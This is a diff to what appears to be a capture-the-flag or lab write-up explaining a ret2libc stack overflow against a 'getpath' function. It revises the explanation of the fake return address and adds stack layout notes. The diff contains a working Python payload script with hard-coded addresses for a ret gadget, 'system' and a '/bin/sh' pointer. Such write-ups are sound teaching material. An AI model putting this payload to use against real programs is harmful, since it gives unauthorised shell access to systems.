@@ -498,14 +498,14 @@ $ objdump -sj .rodata /lib/libc-2.11.2.so | grep "bin"
 ```
 As seen above, the offset of `/bin/sh` is  `0x11f3bf` (`0x11f3c0 - 0x1`, which is the "/" at the beginning of the string that was omitted in the objdump search output). This is the argument that we want to pass to the `system` call so we can pop a shell. 
 
-Now, the information needed to perform a Ret2LibC attack is known. However, the address check bypass is still missing. To bypass the check, a mini-ROP is needed so it's time to search for a `ret` instruction that could be abused for those purposes. A `ret` instruction moves the address at the top of the stack into EIP and decrement the stack by a `WORD` (`ESP + 0x4`). The goal is to prepare the stack to contain the address of `ret` instruction in `getpath` function; the address of `system`; 4 bytes of padding that are needed since we are jumping to `system` directly without the use of a `call` instruction (`call` instruction pushes the EIP to the stack so we need to add a padding of 4 bytes to compensate the missing 4 bytes of the EIP); and the command that is going to be passed to `system` in this case `/bin/sh`.
+Now, the information needed to perform a Ret2LibC attack is known. However, the address check bypass is still missing. To bypass the check, a mini-ROP is needed so it's time to search for a `ret` instruction that could be abused for those purposes. A `ret` instruction moves the address at the top of the stack into EIP and decrement the stack by a `WORD` (`ESP + 0x4`). The goal is to prepare the stack to contain the address of `ret` instruction in `getpath` function; the address of `system`; 4 bytes of padding that are needed since we are jumping to `system` directly without the use of a `call` instruction (`call` instruction pushes the EIP to the stack so we need to add a padding of 4 bytes to compensate the missing 4 bytes of the EIP which is going to work as a fake return address); and the command that is going to be passed to `system` in this case `/bin/sh`.
 
 Thus, the exploit to bypass the address check is the next one:
 ```python
 import struct
 
 padding = "\xAA" * 80
-paddingROP = "\xBB" * 4                        # 1 WORD of garbage
+paddingROP = "\xBB" * 4                        # 1 WORD of padding as the fake return address
 retAddress = struct.pack("I", 0x8048544)       # Address of ret instruction in getpath
 systemAddress = struct.pack("I", 0xb7ecffb0)   # Address of system
 shellAddress = struct.pack("I", 0xb7fb63bf)    # Address that points to /bin/shell
@@ -513,7 +513,14 @@ shellAddress = struct.pack("I", 0xb7fb63bf)    # Address that points to /bin/she
 print(padding + retAddress + systemAddress + paddingROP + shellAddress)
 ```
 
-The stack shall look as follows: 
+The stack shall look as follows:
+$$
+Padding of 0xAA's = 80 bytes
+ret instruction in getpath (ret to .txt) = 0x8048544
+system address = 0xb7ecffb0
+fake system return address = 0xbbbbbbbb
+Pointer to /bin/sh = 0xb7fb63bf
+$$ 
 ```
         +----------------+
         | ESP            |   Padding
@@ -525,7 +532,7 @@ The stack shall look as follows:
         |0xb7ecffb0      |  system function address
         |                |
         +----------------+
-        |\xBB\xBB\xBB\xBB|  ROP padding of arbitraty 0x4 bytes 
+        |\xBB\xBB\xBB\xBB|  ROP padding of arbitraty 0x4 bytes (fake system return address) 
         +----------------+
         |0xb7fb63bf      |  Address that points to /bin/sh, which is the parameter that will be passed to system
         |                |
@@ -552,16 +559,13 @@ At this point, the stack looks like this:
 
 ```
     +----------------+
-    |0x8048544       |
-    |                |  ESP
-    +----------------+
-    |0xb7ecffb0      |  EIP
+    |0xb7ecffb0      |  EBP
 +---+                |
 |   +----------------+
-|   |\xBB\xBB\xBB\xBB|  4 bytes of padding 
+|   |\xBB\xBB\xBB\xBB|  4 bytes of padding to compensate the missing EIP
 |   |                |
 |   +----------------+
-|   |0xb7fb63bf      |  Pointer to /bin/sh
+|   |0xb7fb63bf      |  Arguments passed to system (Pointer to /bin/sh)
 +-->+                |
     +----------------+
 
